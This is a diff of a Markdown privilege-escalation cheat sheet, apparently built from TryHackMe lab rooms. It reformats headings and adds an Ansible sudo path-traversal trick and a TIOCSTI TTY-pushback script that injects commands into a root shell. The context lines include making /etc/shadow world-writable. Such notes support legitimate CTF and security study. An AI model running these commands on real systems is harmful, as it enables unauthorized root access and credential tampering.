@@ -1,5 +1,5 @@
 
-## Finding SUID 
+#### Finding SUID 
 ```
 find / -type f -perm /4000 2>/dev/null
 ```
@@ -9,7 +9,7 @@ find / -type f -perm -u=s 2>/dev/null
 ```
 
 
-## Finding GUID 
+#### Finding GUID 
 ```
 find / -type f -perm /2000 2>/dev/null
 ```
@@ -18,12 +18,12 @@ or
 find / -type f -perm -g=s 2>/dev/null
 ```
 
-## Finding Capabilities
+#### Finding Capabilities
 ```
 getcap -r / 2>/dev/null
 ```
 
-## Find running TCP connections
+#### Find running TCP connections
 
 ```bash
 netstat -tunlpn
@@ -45,7 +45,7 @@ udp        0      0 0.0.0.0:161             0.0.0.0:*                           
 udp6       0      0 ::1:161                 :::*                                -                   
 
 ```
-## Path Injection With Sudo nopasswd
+#### Path Injection With Sudo nopasswd
 
 ```
 m4lwhere@previse:/tmp$ sudo -l
@@ -86,7 +86,7 @@ m4lwhere@previse:/tmp$ sudo -u root /opt/scripts/access_backup.sh
 ```
 
 
-##  Privesc with sudo /bin/tar
+####  Privesc with sudo /bin/tar
 
 ref:- https://tryhackme.com/room/cowboyhacker
 
@@ -110,7 +110,7 @@ tar: Removing leading `/' from member names
 ```
 
 
-## with capabilities ruby 
+#### with capabilities ruby 
 
 ref:- https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_chown
 
@@ -135,3 +135,106 @@ python:-
 ```python
 python -c 'import os;os.chmod("/etc/shadow",0666)
 ```
+
+#### Privesc with sudo Ansible 
+
+```bash
+sudo -l
+```
+
+![ansiblePrivesc01.png](ansiblePrivesc01.png)
+
+```bash
+nano /tmp/a.yml
+```
+
+```bash
+chmod 777 /tmp/a.yml
+```
+
+paste below yml
+
+```yml
+---
+- hosts: localhost
+  tasks:
+    - name: Run id                                    
+      command: id
+      register: id_output  # Register the output of the command
+
+    - name: Display the output of 'id'
+      debug:
+        var: id_output.stdout  # Print the captured output
+
+```
+
+
+```bash
+sudo -u wilbur /usr/bin/ansible-playbook /opt/test_playbooks/../../tmp/a.yml
+```
+
+![ansiblePrivesc02.png](./ansiblePrivesc02.png)
+
+ref:-
+https://tryhackme.com/r/room/backtrack
+https://youtu.be/FPD3BFv_f_Y?si=Jwof3PkTrzcBqBQY&t=2343
+
+#### Privesc with ttypushback
+
+```bash
+./pspy64
+```
+
+![ttypushback01.png](./ttypushback01.png)
+
+```bash
+nano /dev/shm/a.py
+```
+
+```python
+#!/usr/bin/env python3
+import fcntl
+import termios
+import os
+import sys
+import signal
+
+os.kill(os.getppid(), signal.SIGSTOP)
+
+for char in sys.argv[1] + '\n':
+    fcntl.ioctl(0, termios.TIOCSTI, char)
+```
+
+or 
+
+```python
+#!/usr/bin/env python3
+import fcntl
+import termios
+import os
+import sys
+import signal
+
+os.kill(os.getppid(), signal.SIGSTOP)
+
+for char in 'ls -la /root >/dev/shm/a.txt;chmod 777 a.txt' + '\n':
+    fcntl.ioctl(0, termios.TIOCSTI, char)
+```
+
+![ttypushback02.png](./ttypushback02.png)
+wait for 1-2 min for cron
+
+```bash
+ls -la
+```
+```bash
+cat a.txt
+```
+
+
+![ttypushback03.png](./ttypushback03.png)
+
+ref:-
+https://tryhackme.com/r/room/backtrack
+https://www.errno.fr/TTYPushback.html
+https://youtu.be/FPD3BFv_f_Y?si=j0MjXQytaRM2WRQe&t=5466
